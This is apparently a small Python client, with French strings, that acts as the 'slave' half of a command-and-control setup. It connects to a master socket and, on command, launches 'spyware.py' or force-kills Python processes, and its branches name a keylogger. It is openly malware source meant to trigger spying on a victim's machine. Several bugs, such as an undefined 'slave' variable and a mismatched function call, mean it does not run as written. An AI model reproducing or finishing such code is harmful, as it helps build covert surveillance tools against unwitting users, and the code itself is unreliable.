import socket as modSocket
import os 

def start_log(s):
        
    s.connect(machine_maitre)
    if s.recv(1024) == b"Execute":
        print("OK !!!")
        os.system("spyware.py")
    s.send("OK c'est fait !!!".encode("utf-8"))

def stop_log():
        
    s.connect(machine_maitre)
    if s.recv(1024) == b"Stop":
        print("OK !!!")
        os.system("taskkill /f /im python.exe")
    s.send("OK c'est fait !!!".encode("utf-8"))

machine_maitre = (("localhost", 5000))

s = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
s.connect(machine_maitre)
print("slave connecté au serveur")
attaque = slave.recv(1024)


if (attaque == b"attc") :
    start_log(s)
elif (attaque == b"keylogger"):
    stop_log(s)



s.close()